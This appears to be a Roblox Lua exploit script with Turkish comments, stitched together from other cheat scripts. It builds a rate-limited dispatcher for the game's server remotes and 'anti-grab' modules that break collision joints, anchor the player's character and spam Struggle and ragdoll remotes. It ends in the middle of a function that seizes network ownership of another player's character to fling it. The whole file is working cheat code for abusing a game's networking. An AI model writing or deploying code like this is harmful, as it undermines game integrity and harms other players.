getgenv().KozFeature = KozFeature

KozPLR = Services.LocalPlayer
KozRS = Services.rs
KozWS = Workspace
KozRun = RunService
KozPlayers = Players
KozDebris = game:GetService("Debris")
KozMenuToys = KozRS:FindFirstChild("MenuToys")
KozCharEvents = KozRS:FindFirstChild("CharacterEvents")
KozGrabEvents = KozRS:FindFirstChild("GrabEvents")
getgenv().KozPLR = KozPLR

local KozIsHeldFallback = Instance.new("BoolValue")
KozIsHeldFallback.Name = "IsHeld"
KozIsHeldFallback.Value = false

KozRemote = {}
do
    local folders = {
        "GrabEvents",
        "CharacterEvents",
        "MenuToys",
        "PlayerEvents",
        "GameCorrectionEvents",
        "AntiExploit",
    }
    setmetatable(KozRemote, {
        __index = function(_, name)
            for _, folderName in ipairs(folders) do
                local folder = KozRS:FindFirstChild(folderName)
                local child = folder and folder:FindFirstChild(name)
                if child then
                    return child
                end
            end
            local direct = KozRS:FindFirstChild(name)
            if direct then
                return direct
            end
            if name == "IsHeld" then
                -- IsHeld henuz yoksa (veya hic gelmezse) hata vermeyen bos deger
                return KozPLR:FindFirstChild("IsHeld") or KozIsHeldFallback
            end
            return nil
        end,
    })
end
getgenv().KozRemote = KozRemote

function isGucciActiveAndNeedsSpawn()
    if KozFlags then
        if KozFlags.GucciAntiGrab or KozFlags.AntiGucciBlobman or KozFlags.AntiGucciBlobmanFast then
            return true
        end
    end
    return false
end

function isGucciToyName(toyName)
    return toyName == "CreatureBlobman" or toyName == "SantaSleigh" or toyName == "TractorGreen"
end

KozUtil = {}

function KozUtil.isLocalAlive()
    if KozState.isRespawning then return false end
    local char = KozPLR.Character
    if not char or not char.Parent then return false end
    local inWs = false
    local ok = pcall(function() inWs = char:IsDescendantOf(KozWS) end)
    if not ok or not inWs then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return false end
    local dead = false
    pcall(function() dead = (hum:GetState() == Enum.HumanoidStateType.Dead) end)
    if dead then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
    if not hrp or not hrp.Parent then return false end
    return true
end

function KozUtil.isAlive(plr)
    if not plr or plr == KozPLR then return KozUtil.isLocalAlive() end
    if not plr.Parent then return false end
    local char = plr.Character
    if not char or not char.Parent then return false end
    local inWs = false
    local ok = pcall(function() inWs = char:IsDescendantOf(KozWS) end)
    if not ok or not inWs then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return false end
    local dead = false
    pcall(function() dead = (hum:GetState() == Enum.HumanoidStateType.Dead) end)
    if dead then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
    if not hrp or not hrp.Parent then return false end
    return true
end
function KozUtil.getHum(char) return char and char:FindFirstChildOfClass("Humanoid") end
function KozUtil.getRoot(char) return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")) end
getgenv().KozUtil = KozUtil


KozDisp = {}
KozDisp._lastFireTime = {}
KozDisp._fireCount = {}
KozDisp._pendingInvokes = {}
KozDisp._running = false
KozDisp._firing = false
KozDisp._invoking = false
KozDisp._stats = { totalFires = 0, dropped = 0, invokeDropped = 0 }
KozDisp._generation = 0
KozDisp._maxPendingPerName = 2
KozDisp._limits = {
    SetNetworkOwner = 60,
    CreateGrabLine = 60,
    DestroyGrabLine = 60,
    Grab = 15, Drop = 15,
    CreatureGrab = 50, CreatureDrop = 50, CreatureRelease = 10,
    HoldItemRemoteFunction = 30, DropItemRemoteFunction = 30,
    SpawnToyRemoteFunction = 8, DeleteToy = 12, DestroyToy = 12,
    Struggle = 10, RagdollRemote = 10,
    StopAllVelocity = 12, StickyPartEvent = 10,
    BombExplode = 10, ExtendGrabLine = 12, LimitedTimeToyEvent = 5,
    sayMessage = 10, SayMessageRequest = 10,
    _default = 10,
}
KozDisp._highFreqNames = {
    Grab = true, Drop = true, RagdollRemote = true, Struggle = true,
    StickyPartEvent = true, DestroyToy = true, StopAllVelocity = true,
    SpawnToyRemoteFunction = true,
    CreatureGrab = true, CreatureDrop = true, CreatureRelease = true,
    SetNetworkOwner = true, CreateGrabLine = true, DestroyGrabLine = true,
    HoldItemRemoteFunction = true, DropItemRemoteFunction = true,
    BombExplode = true, ExtendGrabLine = true, LimitedTimeToyEvent = true,
    sayMessage = true, SayMessageRequest = true,
}
function KozDisp:_canSend(name)
    local now = tick()
    local limit = self._limits[name] or self._limits._default
    local minInterval = 1 / limit
    local lastTime = self._lastFireTime[name] or 0
    if now - lastTime < minInterval then
        self._stats.dropped = self._stats.dropped + 1
        return false
    end
    self._lastFireTime[name] = now
    return true
end
function KozDisp:Fire(remote, ...)
    if not remote then return end
    if KozState.isRespawning then return end
    if remote and (remote.Name == "SetNetworkOwner" or remote.Name == "CreateGrabLine" or remote.Name == "DestroyGrabLine") then
        local argCount = select("#", ...)
        local firstPart = argCount > 0 and select(1, ...) or nil
        if typeof(firstPart) == "Instance" then
            local myChar = KozPLR.Character
            if myChar then
                local ok, isSelf = pcall(function() return firstPart == myChar or firstPart:IsDescendantOf(myChar) end)
                if ok and isSelf then return end
            end
        end
    end
    self._stats.totalFires = self._stats.totalFires + 1
    if not self:_canSend(remote.Name) then return end
    local args = {...}
    self._firing = true
    pcall(function() remote:FireServer(unpack(args)) end)
    self._firing = false
end
function KozDisp:FireImmediate(remote, ...)
    if not remote then return false end
    local args = {...}
    self._firing = true
    local ok = pcall(function() remote:FireServer(unpack(args)) end)
    self._firing = false
    return ok
end
function KozDisp:Flush()
    self._lastFireTime = {}
    self._fireCount = {}
    for name, count in pairs(self._pendingInvokes) do
        self._stats.invokeDropped = self._stats.invokeDropped + count
    end
    self._pendingInvokes = {}
end
function KozDisp:Invoke(remote, ...)
    if not remote then return nil end
    local name = remote and remote.Name
    if isGucciActiveAndNeedsSpawn() and not isGucciToyName(select(1, ...)) then
        if KozState.isRespawning then
            return nil
        end
    end
    if KozState.isRespawning then return nil end
    local pending = self._pendingInvokes[name] or 0
    if pending >= self._maxPendingPerName then
        self._stats.invokeDropped = self._stats.invokeDropped + 1
        return nil
    end
    self._pendingInvokes[name] = pending + 1
    local args = {...}
    local gen = self._generation
    self._invoking = true
    task.spawn(function()
        if gen ~= self._generation then
            self._pendingInvokes[name] = (self._pendingInvokes[name] or 1) - 1
            self._invoking = false
            return
        end
        local ok, result = pcall(function() return remote:InvokeServer(unpack(args)) end)
        self._pendingInvokes[name] = (self._pendingInvokes[name] or 1) - 1
        self._invoking = false
        if not ok then warn("[Dispatcher] InvokeServer error:", result) end
    end)
    return true
end
function KozDisp:InvokeSync(remote, ...)
    if not remote then return nil end
    if KozState.isRespawning then return nil end
    local name = remote.Name
    if not self:_canSend(name) then return nil end
    self._invoking = true
    local args = {...}
    local ok, result = pcall(function() return remote:InvokeServer(unpack(args)) end)
    self._invoking = false
    if not ok then warn("[Dispatcher] InvokeSync error:", result) end
    return ok and result
end
function KozDisp:NewGeneration()
    self._generation = self._generation + 1
    self._lastFireTime = {}
    self._fireCount = {}
    self._pendingInvokes = {}
end
function KozDisp:Start()
getgenv().KozDisp = KozDisp
    self._running = true
end
function KozDisp:Stop()
    self._running = false
end
function KozDisp:GetStats()
    return self._stats.totalFires, 0, self._stats.dropped, self._stats.invokeDropped, self._generation
end

-- Respawn takibi (musa(4) 685-800'den uyarlama): canlanma sirasinda
-- dispatcher gonderimi keser, character hazir olunca jenerasyon sifirlanir.
do
    local function markDead()
        KozState.isRespawning = true
        KozDisp:NewGeneration()
    end
    local function markAlive()
        if KozState.isRespawning then
            KozState.isRespawning = false
            KozDisp:NewGeneration()
        end
    end
    local function watch(char)
        local hum = char:WaitForChild("Humanoid", 10)
        if not hum then
            markAlive()
            return
        end
        hum.Died:Connect(markDead)
        task.spawn(function()
            task.wait(0.8)
            if hum.Parent and hum.Health > 0 then
                markAlive()
            end
        end)
    end
    if KozPLR.Character then
        watch(KozPLR.Character)
    end
    KozPLR.CharacterAdded:Connect(watch)
    KozPLR.CharacterAdded:Connect(function()
        markDead()
    end)
end

-- endorist (endrst.txt 1078-1107): Anti Blobman Kill motoru
function KozFeature.startAntiBlobmanKill()
    if KozState.antiBlobmanKillConn then KozState.antiBlobmanKillConn:Disconnect() end
    local lastUpdate = 0
    KozState.antiBlobmanKillConn = KozRun.Heartbeat:Connect(function()
        if not KozFlags.AntiBlobmanKill then return end
        local now = tick()
        if now - lastUpdate < 0.033 then return end
        lastUpdate = now
        local char = KozPLR.Character
        if not char then return end
        local hum = char:FindFirstChild("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp or hum.Health <= 0 then return end
        hum.Sit = true
        hum:ChangeState(Enum.HumanoidStateType.Running)
        local camera = KozWS.CurrentCamera
        if camera then
            local lookVec = camera.CFrame.LookVector
            hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(lookVec.X, 0, lookVec.Z))
        end
    end)
end

function KozFeature.stopAntiBlobmanKill()
    KozFlags.AntiBlobmanKill = false
    if KozState.antiBlobmanKillConn then
        KozState.antiBlobmanKillConn:Disconnect()
        KozState.antiBlobmanKillConn = nil
    end
end


-- =====================================================================
-- [KOZMOZ PORT] Anti Grab (PNG 13 -> PNG 14)
-- Eski "Enable Anti Grab" toggle'i + "Basic/Escape Anything" dropdown'i
-- kaldirildi; yerine musa(4) 4415-4460'daki "Anti Grab" toggle'i ve
-- "Anti Grab Method" (Ragdoll / Seatless Gucci / Default) secimi geldi.
-- Motor: musa(4) 902-1024 (setupAntiGrabV1), 1025-1114 (Seatless Gucci),
-- 1115-1135 (Default).
-- =====================================================================
do
    local PROTECTED_PLAYER = "5fkX0ofvIGfU"
    local function isProtectedPlayer(name)
        return name == PROTECTED_PLAYER
    end

    function KozFeature.startStruggleLoop()
        local char = KozPLR.Character
        if not char or KozState.struggleTasks[char] then return end
        KozState.struggleTasks[char] = true
        task.spawn(function()
            while KozState.struggleTasks[char] do
                local head = char:FindFirstChild("Head")
                if head and head:FindFirstChild("PartOwner") and KozRemote.IsHeld.Value then
                    local grabberName = head.PartOwner.Value
                    KozDisp:Fire(KozRemote.Struggle)
                    local gce = KozRS:FindFirstChild("GameCorrectionEvents")
                    if gce then
                        local sav = gce:FindFirstChild("StopAllVelocity")
                        if sav then KozDisp:Fire(sav) end
                    end
                else
                    KozState.struggleTasks[char] = nil
                    break
                end
                task.wait(0.1)
            end
        end)
    end
    function KozFeature.setupAntiGrabV1()
        if KozState.connections.antiGrabChanged then
            KozState.connections.antiGrabChanged:Disconnect()
            KozState.connections.antiGrabChanged = nil
        end
        if KozState.connections.antiGrabCharAdded then
            KozState.connections.antiGrabCharAdded:Disconnect()
            KozState.connections.antiGrabCharAdded = nil
        end
        local lastHolder = nil
        local function updateHolder(char)
            if not char then return end
            local head = char:FindFirstChild("Head")
            if head then
                local po = head:FindFirstChild("PartOwner")
                if po then lastHolder = tostring(po.Value) end
            end
            char.DescendantAdded:Connect(function(desc)
                if desc.Name == "PartOwner" then
                    lastHolder = tostring(desc.Value)
                end
            end)
        end
        local function tryStart(isBeingHeld)
            if not isBeingHeld then return end
            if not KozFlags.AntiGrab then return end
            if not KozUtil.isLocalAlive() then return end
            if lastHolder and isProtectedPlayer(lastHolder) then return end
            local char = KozPLR.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            if not KozRemote.IsHeld.Value then return end
            local conn
            local trackedChar = char
            conn = KozRun.Heartbeat:Connect(function()
                if not KozUtil.isLocalAlive() then
                    pcall(function() if hrp and hrp.Parent then hrp.Anchored = false end end)
                    if conn then conn:Disconnect() end
                    return
                end
                if not hrp or not hrp.Parent or hrp:IsDescendantOf(KozWS) == false then
                    pcall(function() if hrp and hrp.Parent then hrp.Anchored = false end end)
                    if conn then conn:Disconnect() end
                    return
                end
                if trackedChar ~= KozPLR.Character then
                    pcall(function() if hrp and hrp.Parent then hrp.Anchored = false end end)
                    if conn then conn:Disconnect() end
                    return
                end
                if KozRemote.IsHeld.Value then
                    pcall(function()
                        hrp.Velocity = Vector3.new()
                        hrp.Anchored = true
                        KozDisp:Fire(KozRemote.Struggle, KozPLR)
                        KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0)
                    end)
                else
                    pcall(function() if hrp and hrp.Parent then hrp.Anchored = false end end)
                    if conn then conn:Disconnect() end
                end
            end)
        end
        KozState.connections.antiGrabChanged = KozRemote.IsHeld.Changed:Connect(tryStart)
        local char = KozPLR.Character
        if char and KozUtil.isLocalAlive() then updateHolder(char) end
        KozState.connections.antiGrabCharAdded = KozPLR.CharacterAdded:Connect(function(newChar)
            task.wait(0.6)
            if KozUtil.isLocalAlive() then
                updateHolder(newChar)
            end
        end)
        if KozRemote.IsHeld.Value then
            tryStart(true)
        end
    end
    function KozFeature.disableAntiGrabV1()
        if KozState.connections.antiGrabChanged then
            KozState.connections.antiGrabChanged:Disconnect()
            KozState.connections.antiGrabChanged = nil
        end
        if KozState.connections.antiGrabCharAdded then
            KozState.connections.antiGrabCharAdded:Disconnect()
            KozState.connections.antiGrabCharAdded = nil
        end
    end

    do
        local seatlessGucciActive = false
        local seatlessGucciConn = nil
        local seatlessSpawnTick = nil
        function KozFeature.startSeatlessGucci()
            seatlessGucciActive = true
            KozFlags.SeatlessGucciAntiGrab = true
            if not seatlessGucciConn then
                local ContextActionService = game:GetService("ContextActionService")
                seatlessGucciConn = KozRun.RenderStepped:Connect(function()
                    if not seatlessGucciActive then return end
                    if not KozUtil.isLocalAlive() then return end
                    local char = KozPLR.Character
                    if not char then return end
                    local hum = char:FindFirstChild("Humanoid")
                    local root = char:FindFirstChild("HumanoidRootPart")
                    local myToys = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                    local ocarina = myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")
                    if ocarina then
                        for _, prt in ipairs(char:GetChildren()) do
                            local owner = prt:FindFirstChild("PartOwner")
                            if owner and owner.Value ~= "" then
                                local holdPart = ocarina:FindFirstChild("HoldPart")
                                local holdFunc = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
                                if holdFunc then
                                    task.spawn(function()
                                        pcall(function() holdFunc:InvokeServer(ocarina, char) end)
                                    end)
                                    local menuToys = KozRS:FindFirstChild("MenuToys")
                                    local destroyToy = menuToys and menuToys:FindFirstChild("DestroyToy")
                                    if destroyToy then
                                        pcall(function() destroyToy:FireServer(ocarina) end)
                                    end
                                    if hum then
                                        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                                        hum.AutoRotate = true
                                        if hum.Sit then
                                            hum.Sit = false
                                        end
                                    end
                                    pcall(function()
                                        ContextActionService:UnbindAction("Escape")
                                        ContextActionService:UnbindAction("JumpRemover")
                                    end)
                                    owner.Value = ""
                                end
                            end
                        end
                    else
                        local canSpawn = KozPLR:FindFirstChild("CanSpawnToy")
                        if canSpawn and canSpawn.Value and not seatlessSpawnTick then
                            seatlessSpawnTick = tick()
                            task.spawn(function()
                                pcall(function()
                                    KozRemote.SpawnToyRemoteFunction:InvokeServer("InstrumentWoodwindOcarina", CFrame.new(1e5, 1e5, 1e5), Vector3.zero)
                                end)
                            end)
                        elseif seatlessSpawnTick and tick() - seatlessSpawnTick > 1 and not (myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")) then
                            seatlessSpawnTick = nil
                        end
                        local grabbed = false
                        for _, prt in ipairs(char:GetChildren()) do
                            local owner = prt:FindFirstChild("PartOwner")
                            if owner and owner.Value ~= "" then
                                grabbed = true
                                break
                            end
                        end
                        if grabbed then
                            local charEvents = KozRS:FindFirstChild("CharacterEvents")
                            if charEvents then
                                local struggle = charEvents:FindFirstChild("Struggle")
                                local ragdollRemote = charEvents:FindFirstChild("RagdollRemote")
                                if struggle then pcall(function() struggle:FireServer(KozPLR) end) end
                                if ragdollRemote and root then pcall(function() ragdollRemote:FireServer(root, 0) end) end
                            end
                        end
                    end
                end)
            end
        end
        function KozFeature.stopSeatlessGucci()
            seatlessGucciActive = false
            KozFlags.SeatlessGucciAntiGrab = false
            if seatlessGucciConn then
                seatlessGucciConn:Disconnect()
                seatlessGucciConn = nil
            end
        end
    end

    do
        local defaultGrabConn = nil
        function KozFeature.startDefaultGrab()
            if not defaultGrabConn then
                defaultGrabConn = KozRun.Heartbeat:Connect(function()
                    if not KozUtil.isLocalAlive() then return end
                    local char = KozPLR.Character
                    local head = char and char:FindFirstChild("Head")
                    if head and head:FindFirstChild("PartOwner") and KozRemote.IsHeld.Value then
                        pcall(function() KozDisp:Fire(KozRemote.Struggle, KozPLR) end)
                    end
                end)
            end
        end
        function KozFeature.stopDefaultGrab()
            if defaultGrabConn then
                defaultGrabConn:Disconnect()
                defaultGrabConn = nil
            end
        end
    end

    -- [KOZMOZ PORT] "Kozmoz Grab(Best)" motoru: kullanicinin verdigi
    -- collision-break AntiGrab modulu (oldugu gibi sarildi, disa KozGrabBest
    -- olarak aciliyor; agirsagindaki eski Anti Grab yontemleri ayrica secilebilir)
    KozGrabBest = (function()
        --[[
            Collision-Break AntiGrab  (birleştirilmiş / temizlenmiş)

            Kaynak bloklar:
              e axum.txt            1727-1850  ("Anti Blobman kill")  -> BallSocket + WeldConstraint kırma
              xocu.txt              1696-1824  ("Anti Grab BEST")     -> CanCollide kırma + CFrame pinning
              musa(4)...txt         916-1013   (setupAntiGrabV1)      -> IsHeld watcher + velocity kilidi
              musa(4)...txt         1278-1314                         -> RagdollLimbPart.CanCollide primitifi

            Mantık:
              tespit (PartOwner / IsHeld) -> collision break -> struggle/ragdoll/grabline spam
              -> anchor kilidi + manuel yürüyüş -> bırakılınca tam restore
        --]]

        local Players      = game:GetService("Players")
        local RS           = game:GetService("ReplicatedStorage")
        local RunService   = game:GetService("RunService")

        local plr = Players.LocalPlayer

        -- ── Remote'lar ────────────────────────────────────────────────────────────────
        local CharacterEvents  = RS:WaitForChild("CharacterEvents")
        local GrabEvents       = RS:WaitForChild("GrabEvents")
        local Struggle         = CharacterEvents:WaitForChild("Struggle")
        local RagdollRemote    = CharacterEvents:WaitForChild("RagdollRemote")
        local DestroyGrabLine  = GrabEvents:WaitForChild("DestroyGrabLine")
        local StopAllVelocity  = (function()
            local gce = RS:FindFirstChild("GameCorrectionEvents")
            return gce and gce:FindFirstChild("StopAllVelocity") or nil
        end)()

        -- ── Ayarlar ───────────────────────────────────────────────────────────────────
        local CFG = {
            LIMBS          = { "Left Arm", "Right Arm", "Left Leg", "Right Leg" },
            LIMB_OFFSET    = {                                -- xocu 1732-1735
                ["Left Arm"]  = CFrame.new(-1.5,  0, 0),
                ["Right Arm"] = CFrame.new( 1.5,  0, 0),
                ["Left Leg"]  = CFrame.new(-0.5, -2, 0),
                ["Right Leg"] = CFrame.new( 0.5, -2, 0),
            },
            WALK_STEP      = 0.43,                            -- anchor'lıyken manuel adım
            STRUGGLE_RATE  = 1/10,                            -- musa RemoteBudget: Struggle = 10/s
            GRABLINE_RATE  = 1/20,
            PIN_LIMBS      = true,                            -- uzuvları Torso'ya yapıştır
            SERVER_BREAK   = false,                           -- Blobman CreatureDrop ile server-side joint break
        }

        -- ── Durum ─────────────────────────────────────────────────────────────────────
        local AG = {
            Enabled   = false,
            Busy      = false,
            Walking   = false,
            Broken    = false,
            Cons      = {},
        }

        local function bind(key, conn)
            if AG.Cons[key] then AG.Cons[key]:Disconnect() end
            AG.Cons[key] = conn
        end

        local function unbindAll()
            for k, c in pairs(AG.Cons) do
                if c then pcall(function() c:Disconnect() end) end
                AG.Cons[k] = nil
            end
        end

        -- ══════════════════════════════════════════════════════════════════════════════
        -- 1) COLLISION BREAK — çekirdek
        -- ══════════════════════════════════════════════════════════════════════════════
        -- state = false  -> kır (grab tutamaz)
        -- state = true   -> geri yükle
        local function setRagdollBody(char, state)
            if not char then return end
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("BasePart") and v.Name ~= "Head" and v.Name ~= "HumanoidRootPart" then
                    -- a) ragdoll eklemleri                                  (e axum 1784-1786)
                    local bsc = v:FindFirstChild("BallSocketConstraint")
                    if bsc then pcall(function() bsc.Enabled = state end) end

                    -- b) collision gövdesi + onu uzva bağlayan weld         (e axum 1786-1788)
                    local rlp = v:FindFirstChild("RagdollLimbPart")
                    if rlp then
                        pcall(function() rlp.CanCollide = state end)
                        local wc = rlp:FindFirstChildWhichIsA("WeldConstraint")
                        if wc then pcall(function() wc.Enabled = state end) end
                    end

                    -- c) uzvun kendi çarpışması                             (xocu 1732-1735 / 1741)
                    if table.find(CFG.LIMBS, v.Name) then
                        pcall(function() v.CanCollide = state end)
                    end
                end
            end
            AG.Broken = not state
        end

        -- Uzuvları her frame Torso'ya yapıştır (ragdoll yayılıp takılamasın)
        local function pinLimbs(char, torso)
            if not (CFG.PIN_LIMBS and char and torso) then return end
            for _, name in ipairs(CFG.LIMBS) do
                local limb = char:FindFirstChild(name)
                if limb then
                    pcall(function() limb.CFrame = torso.CFrame * CFG.LIMB_OFFSET[name] end)
                end
            end
        end

        -- Opsiyonel: server-side joint break (e axum 9461-9470)
        local function serverJointBreak(char)
            if not CFG.SERVER_BREAK then return end
            local toys = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            local blob = toys and toys:FindFirstChild("CreatureBlobman")
            local scr  = blob and blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            local drop = scr and scr:FindFirstChild("CreatureDrop")
            if not drop then return end
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("Weld") or p:IsA("BallSocketConstraint") then
                    pcall(function() drop:FireServer(p, p) end)
                end
            end
        end

        -- ══════════════════════════════════════════════════════════════════════════════
        -- 2) Tespit yardımcıları
        -- ══════════════════════════════════════════════════════════════════════════════
        local function isHeldNow(char)
            local head   = char and char:FindFirstChild("Head")
            local isHeld = plr:FindFirstChild("IsHeld")
            return (head and head:FindFirstChild("PartOwner") ~= nil)
                or (isHeld and isHeld.Value == true)
        end

        local function grabberName(char)
            local head = char and char:FindFirstChild("Head")
            local po   = head and head:FindFirstChild("PartOwner")
            return po and tostring(po.Value) or nil
        end

        -- ══════════════════════════════════════════════════════════════════════════════
        -- 3) Kurtulma döngüsü
        -- ══════════════════════════════════════════════════════════════════════════════
        local function escapeRoutine(char)
            if AG.Busy then return end
            AG.Busy = true

            local hum   = char:FindFirstChild("Humanoid")
            local hrp   = char:FindFirstChild("HumanoidRootPart")
            local head  = char:FindFirstChild("Head")
            local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
            if not (hum and hrp and head) then AG.Busy = false return end

            -- ① collision break
            setRagdollBody(char, false)
            serverJointBreak(char)
            hum.Sit = false

            -- ② remote spam (rate-limitli)
            task.spawn(function()
                local tS, tG = 0, 0
                while AG.Enabled and isHeldNow(char) and char.Parent do
                    local now = os.clock()
                    if now - tS >= CFG.STRUGGLE_RATE then
                        tS = now
                        pcall(function() Struggle:FireServer(plr) end)
                        pcall(function() RagdollRemote:FireServer(hrp, 0) end)
                        if StopAllVelocity then pcall(function() StopAllVelocity:FireServer() end) end
                    end
                    if now - tG >= CFG.GRABLINE_RATE then
                        tG = now
                        pcall(function() DestroyGrabLine:FireServer(hrp) end)
                    end
                    task.wait()
                end
            end)

            -- ③ pozisyon kilidi + manuel yürüyüş
            task.spawn(function()
                local lockedCF = hrp.CFrame
                hrp.Anchored = true
                if not AG.Walking then
                    AG.Walking = true
                    while AG.Enabled and isHeldNow(char) and char.Parent do
                        pcall(function()
                            hrp.AssemblyLinearVelocity  = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                            lockedCF = lockedCF + hum.MoveDirection * CFG.WALK_STEP
                            hrp.CFrame = lockedCF
                            pinLimbs(char, torso)
                            hum.Sit       = false
                            hum.AutoRotate = true
                        end)
                        task.wait()
                    end
                    AG.Walking = false
                end

                -- ④ restore
                pcall(function() hrp.Anchored = false end)
                setRagdollBody(char, true)
                pcall(function()
                    hum.HipHeight = 0
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                end)
                AG.Busy = false
            end)
        end

        -- ══════════════════════════════════════════════════════════════════════════════
        -- 4) Karakter kurulumu
        -- ══════════════════════════════════════════════════════════════════════════════
        local function setupCharacter(char)
            if not (AG.Enabled and char) then return end

            local hum   = char:WaitForChild("Humanoid", 5)
            local hrp   = char:WaitForChild("HumanoidRootPart", 5)
            local head  = char:WaitForChild("Head", 5)
            local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
            if not (hum and hrp and head) then return end

            AG.Busy, AG.Walking = false, false

            -- a) Head'e PartOwner eklenmesi = grab başladı
            bind("Head", head.ChildAdded:Connect(function(obj)
                if AG.Enabled and obj.Name == "PartOwner" then
                    escapeRoutine(char)
                end
            end))

            -- b) IsHeld yedek tetikleyici
            local isHeld = plr:FindFirstChild("IsHeld")
            if isHeld then
                bind("IsHeld", isHeld:GetPropertyChangedSignal("Value"):Connect(function()
                    if AG.Enabled and isHeld.Value then escapeRoutine(char) end
                end))
            end

            -- c) Ragdolled -> anında collision break
            local ragdolled = hum:FindFirstChild("Ragdolled")
            if ragdolled then
                bind("Ragdoll", ragdolled.Changed:Connect(function()
                    if not AG.Enabled then return end
                    if ragdolled.Value then
                        setRagdollBody(char, false)
                    elseif not isHeldNow(char) then
                        setRagdollBody(char, true)
                    end
                end))
            end

            -- d) WeldHRP -> sit/weld kırıcı
            local weldHRP = hrp:WaitForChild("WeldHRP", 5)
            if weldHRP then
                bind("Weld", weldHRP:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if not AG.Enabled or not weldHRP.Enabled then return end
                    task.spawn(function()
                        while AG.Enabled and weldHRP.Enabled and char.Parent do
                            pcall(function()
                                hum.Sit        = false
                                hum.AutoRotate = true
                                hum.HipHeight  = 0
                                head.CFrame    = hrp.CFrame + Vector3.new(0, 1.35, 0)
                            end)
                            task.wait()
                        end
                        pcall(function() hum.HipHeight = 0 end)
                    end)
                end))
            end

            -- e) uzuv pinleme (ragdoll açıkken)
            bind("Pin", RunService.Heartbeat:Connect(function()
                if not AG.Enabled then return end
                local rg = hum:FindFirstChild("Ragdolled")
                if rg and rg.Value then pinLimbs(char, torso) end
            end))

            -- açılış anında zaten tutuluyorsak
            if isHeldNow(char) then escapeRoutine(char) end
        end

        -- ══════════════════════════════════════════════════════════════════════════════
        -- 5) Public API
        -- ══════════════════════════════════════════════════════════════════════════════
        local Module = {}

        function Module:Set(on)
            AG.Enabled = on and true or false
            unbindAll()

            if AG.Enabled then
                if plr.Character then setupCharacter(plr.Character) end
                bind("CharAdded", plr.CharacterAdded:Connect(function(c)
                    AG.Busy, AG.Walking = false, false
                    task.wait(0.4)
                    setupCharacter(c)
                end))
            else
                local char = plr.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then pcall(function() hrp.Anchored = false end) end
                    setRagdollBody(char, true)
                end
                AG.Busy, AG.Walking = false, false
            end
        end

        function Module:Toggle() self:Set(not AG.Enabled) end
        function Module:IsEnabled() return AG.Enabled end
        function Module:Config() return CFG end

        -- Mevcut UI'ına bağlamak için:
        --   DefenseGroup:CreateToggle({ Name = "Collision Break AntiGrab",
        --       Callback = function(v) Module:Set(v) end })

        return Module
    end)()
    ClassicDefense:AddToggle("AntiGrabV2", {
        Text = "Kozmoz Grab(Best)",
        Default = false,
        Callback = function(enabled)
            KozFlags.AntiGrab = enabled
            -- yeni motor: kullanicinin modulu (collision break)
            pcall(function()
                if KozGrabBest then KozGrabBest:Set(enabled) end
            end)
            local sel = KozState.antiGrabMethods or {}
            if typeof(sel) == "string" then
                sel = { [sel] = true }
            end
            if enabled then
                if sel["Ragdoll"] then
                    pcall(function()
                        KozFeature.setupAntiGrabV1()
                        KozDisp:Fire(KozRemote.Struggle, KozPLR)
                    end)
                end
                if sel["Seatless Gucci"] then
                    pcall(KozFeature.startSeatlessGucci)
                end
                if sel["Default"] then
                    pcall(KozFeature.startDefaultGrab)
                end
            else
                pcall(KozFeature.disableAntiGrabV1)
                pcall(KozFeature.stopSeatlessGucci)
                pcall(KozFeature.stopDefaultGrab)
            end
        end
    })

    ClassicDefense:AddDropdown("AntiGrabMethod", {
        Text = "Anti Grab Method",
        Multi = true,
        Values = {"Ragdoll", "Seatless Gucci", "Default"},
        Default = {"Ragdoll"},
        Callback = function(sel)
            if typeof(sel) == "string" then
                sel = { [sel] = true }
            end
            KozState.antiGrabMethods = sel
            if KozFlags.AntiGrab then
                pcall(KozFeature.disableAntiGrabV1)
                pcall(KozFeature.stopSeatlessGucci)
                pcall(KozFeature.stopDefaultGrab)
                if sel["Ragdoll"] then
                    pcall(function()
                        KozFeature.setupAntiGrabV1()
                        KozDisp:Fire(KozRemote.Struggle, KozPLR)
                    end)
                end
                if sel["Seatless Gucci"] then
                    pcall(KozFeature.startSeatlessGucci)
                end
                if sel["Default"] then
                    pcall(KozFeature.startDefaultGrab)
                end
            end
        end
    })
end

defenseEnabled = false
defenseConnection = nil
defenseMode = "Fling"

function getAttacker()
    char = LocalPlayer.Character
    if not char or not char:FindFirstChild("Head") then
        return
    end
    owner = char.Head:FindFirstChild("PartOwner")
    if not owner or not owner:IsA("StringValue") then
        return
    end
    return Players:FindFirstChild(owner.Value)
end

function performFling(attacker)
    if not attacker or not attacker.Character then
        return
    end
    root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        Services.SetNetOwner:FireServer(root, root.CFrame)
        if Services.DestroyGrabLine then
            Services.DestroyGrabLine:FireServer(root)
        end
        away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
        away = Vector3.new(away.X, away.Y, 0) * 900
        bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganFling"
